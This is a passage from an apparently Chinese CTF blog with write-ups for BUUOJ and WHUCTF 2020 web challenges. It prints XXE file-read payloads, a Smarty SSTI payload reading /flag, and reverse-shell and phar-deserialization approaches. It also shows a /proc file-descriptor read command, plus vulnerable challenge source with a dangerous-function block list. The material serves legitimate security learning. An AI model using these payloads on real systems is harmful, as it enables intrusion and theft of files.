&gt;&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;456&lt;/password&gt;&lt;/user&gt;</code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*** autor: c0ny1* date: 2018-2-7*/</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//账号</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//密码</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>step2：</strong>getflag</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY xxe SYSTEM &quot;http://173.137.200.11&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2020/05/27/buuoj-1/xxe1.png" alt="result"></p><h1 id="3-反序列化"><a href="#3-反序列化" class="headerlink" title="3.  反序列化"></a>3.  反序列化</h1><h2 id="3-1-session的反序列化"><a href="#3-1-session的反序列化" class="headerlink" title="3.1  session的反序列化"></a>3.1  session的反序列化</h2><h3 id="3-1-1-bestphp’s-revenge"><a href="#3-1-1-bestphp’s-revenge" class="headerlink" title="3.1.1  bestphp’s revenge"></a>3.1.1  bestphp’s revenge</h3><p><strong>考点：</strong>session的反序列化 + extract变量覆盖 +SoapClient原生类的使用</p><p><strong>参考资料</strong>：</p><p><strong>1、</strong><code>[LCTF]bestphp&#39;s revenge</code>  <a href="https://www.cnblogs.com/20175211lyz/p/11515519.html#1%E3%80%81soapclient%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4ssrf" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11515519.html#1%E3%80%81soapclient%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4ssrf</a></p><p><strong>2、</strong><code>LCTF 2018 Writeup -- Nu1L</code>  <a href="https://xz.aliyun.com/t/3341#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/3341#toc-13</a></p><p><strong>3、</strong><code>从几道CTF题看SOAP安全问题</code>  <a href="https://www.anquanke.com/post/id/153065#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1</a></p><p><strong>4、</strong><code>PHP : Winning the race against PHP (alternative way to easy_php @ N1CTF2018)</code>  <a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="noopener">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></p><p><strong>5、</strong><code>[转载]CRLF Injection漏洞的利用与实例分析</code>  <a href="https://www.jianshu.com/p/d4c304dbd0af" target="_blank" rel="noopener">https://www.jianshu.com/p/d4c304dbd0af</a></p><p><strong>6、</strong><code>Class &#39;SoapClient&#39; not found 解决方法</code>  <a href="https://www.cnblogs.com/xlw1219/p/3198261.html" target="_blank" rel="noopener">https://www.cnblogs.com/xlw1219/p/3198261.html</a></p><p><strong>思路：</strong></p><p><strong>step1：</strong>用session_start设置serialize_handler为php_serialize， <code>$_SESSION[&#39;name&#39;]</code> 处注入poc。</p><p><strong>step2：</strong>session_start处实现反序列化，得到上一步poc里的SoapClient类，call_user_func调用SoapClient， 使SoapClient发送请求 。</p><p><strong>step3：</strong>带上指定的PHPSESSID访问index.php，<code>var_dump($_SESSION)</code>，即输出flag。</p><p><strong>注意事项：</strong></p><p><strong>1、</strong>\n、\r用双引号括起来表示换行、回车，而用单引号括起来，仅表示字符，这一点在写poc的时候是个坑。</p><p>（Windows系统里面，每行结尾是<code>“&lt;回车&gt;&lt;换行&gt;”</code>，即<code>“\r\n”</code>；）</p><p><strong>2、</strong>burpsuite改包的时候要修改Content-Length，即为post内容的长度。</p><h1 id="4-rce"><a href="#4-rce" class="headerlink" title="4.  rce"></a>4.  rce</h1><h2 id="4-1-反弹shell"><a href="#4-1-反弹shell" class="headerlink" title="4.1  反弹shell"></a>4.1  反弹shell</h2><h3 id="4-1-1-V-amp-N2020-公开赛-CHECKIN"><a href="#4-1-1-V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="4.1.1  [V&amp;N2020 公开赛]CHECKIN"></a>4.1.1  [V&amp;N2020 公开赛]CHECKIN</h3><p><strong>考点：</strong>反弹shell</p><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://www.cnblogs.com/yesec/p/12387671.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12387671.html</a></p><p><strong>2、</strong><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/12514481.html" target="_blank" rel="noopener">https://www.cnblogs.com/Wanghaoran-s1mple/p/12514481.html</a></p><p><strong>源代码：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>flag_file <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># flag = flag_file.read()</span><span class="token comment" spellcheck="true"># flag_file.close()</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># @app.route('/flag')</span><span class="token comment" spellcheck="true"># def flag():</span><span class="token comment" spellcheck="true">#     return flag</span><span class="token comment" spellcheck="true">## want flag? naive!</span><span class="token comment" spellcheck="true"># You will never find the thing you want:) I think</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm -f flag.txt"</span><span class="token punctuation">)</span>    exec_cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>exec_cmd<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"1"</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路：</strong></p><p>step1：反弹shell</p><p>step2： 文件描述符储存在<code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p><pre><code>python3 -c &quot;import os;[os.system(&#39;cat /proc/&#39;+str(i)+&#39;/fd/3&#39;) for i in range(0,20)]&quot;</code></pre><p><strong>注意事项：</strong></p><p>/shell路由下提交参数。</p><h1 id="5-ssti"><a href="#5-ssti" class="headerlink" title="5.  ssti"></a>5.  ssti</h1><h2 id="5-1-smarty"><a href="#5-1-smarty" class="headerlink" title="5.1  smarty"></a>5.1  smarty</h2><h3 id="5-1-1-CISCN2019-华东南赛区-Web11"><a href="#5-1-1-CISCN2019-华东南赛区-Web11" class="headerlink" title="5.1.1  [CISCN2019 华东南赛区]Web11"></a>5.1.1  [CISCN2019 华东南赛区]Web11</h3><p><strong>考点：</strong>smarty  ssti模板注入</p><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://www.cnblogs.com/mech/p/12901173.html" target="_blank" rel="noopener">https://www.cnblogs.com/mech/p/12901173.html</a></p><pre><code>paylaod:7{*comment*}7     判断smarty模板注入{if readfile(&quot;/flag&quot;)}{/if}    getflag</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020_WHUCTF</title>
      <link href="/2020/05/26/2020-whuctf/"/>
      <url>/2020/05/26/2020-whuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="1-web"><a href="#1-web" class="headerlink" title="1.  web"></a>1.  web</h1><h2 id="1-1-Easy-unserialize"><a href="#1-1-Easy-unserialize" class="headerlink" title="1.1  Easy_unserialize"></a>1.1  Easy_unserialize</h2><p><strong>考点：</strong>猜猜猜 + phar反序列化</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>简析GXY_CTF “BabySqli v3.0”之Phar反序列化  <a href="https://www.gem-love.com/ctf/490.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/490.html</a></p><p>感觉是以前的原题，但源码泄露位置始终找不到，太菜了！！</p><p><strong>2、</strong>writeup：<a href="https://www.52hertz.tech/2020/05/26/whuctf2020_writeup/#Easy-unserialize" target="_blank" rel="noopener">https://www.52hertz.tech/2020/05/26/whuctf2020_writeup/#Easy-unserialize</a></p><p><strong>思路：</strong></p><p><strong>step1：</strong>主页面访问?acti0n=php://filter/convert.Base64-encode/resource=upload.php</p><p>acti0n真不知道哪里来的，对base有过滤，大写绕过。</p><p><strong>step2：</strong>view.php页面的file_exists可结合phar实现反序列化；</p><p>生成的phar文件改后缀名，绕过限制（本题phar在白名单内，那就不用改）；</p><p>读flag.php用show_source或者highlight_file都可以。</p><p><strong>step3：</strong>delete=phar://new4.jpg</p><p><img src="/2020/05/26/2020-whuctf/5.png" alt="result"></p><p><strong>upload.php</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">'upload/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token function">error_get_last</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Failed to make the directory'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$ans</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">204800</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'filesize too big.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'filename can not be empty!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(htaccess)|(user)|(..)|(%)|(#)/i'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$ans</span> <span class="token operator">!=</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$ans</span> <span class="token operator">!=</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$ans</span> <span class="token operator">!=</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#用exif_imagetype来检测文件类型</span>      <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string">'image/gif'</span> <span class="token keyword">or</span> <span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string">'image/jpg'</span> <span class="token keyword">or</span> <span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string">'image/png'</span> <span class="token keyword">or</span> <span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p align=\"center\">Don't cheat me with Content-Type!&lt;/p>"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;p align=\"center\">You can't upload this kind of file!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'&lt;script>alert("You could not upload this image because of some dangerous code in your file!")&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment">#  后台解析，出现弹框</span>      exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>       <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">#查找字符串在另一字符串中最后一次出现的位置（区分大小写）</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i'</span><span class="token punctuation">,</span> <span class="token variable">$extension</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;p align=\"center\">You can't upload this kind of file!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;p align=\"center\">Your file $name has been uploaded.&lt;br>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">'&lt;script>alert("此地无银三百两")&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;p align=\"center\">&lt;a href=\"view.php\" >此地无银三百两&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#header(</span><span class="token string">"refresh:3;url=index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>view.php</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#include_once </span><span class="token string">"flag.php"</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">View</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token string">'upload/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string">'echo "&lt;div style="text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;">Powered by: xxx&lt;/div>";'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">get_file_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">show_file_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_file_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token shell-comment comment">#sizeof 返回数组中元素的数目。</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;p align=\"center\" style=\"font-weight: bold;\">[\".strval($i - 1).\"]  $file[$i] &lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">show_img</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token variable">$width</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$height</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$times</span> <span class="token operator">=</span> <span class="token variable">$width</span> <span class="token operator">/</span> <span class="token number">200</span><span class="token punctuation">;</span>    <span class="token variable">$width</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token variable">$times</span><span class="token punctuation">;</span>    <span class="token variable">$height</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token variable">$times</span><span class="token punctuation">;</span>    <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token string">"&lt;img style=\"clear: both;display: block;margin: auto;\" src=\"$this->dir$name\" alt=\"$file_name\" width = \"$width\" height = \"$height\">"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$template</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">delete_img</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token 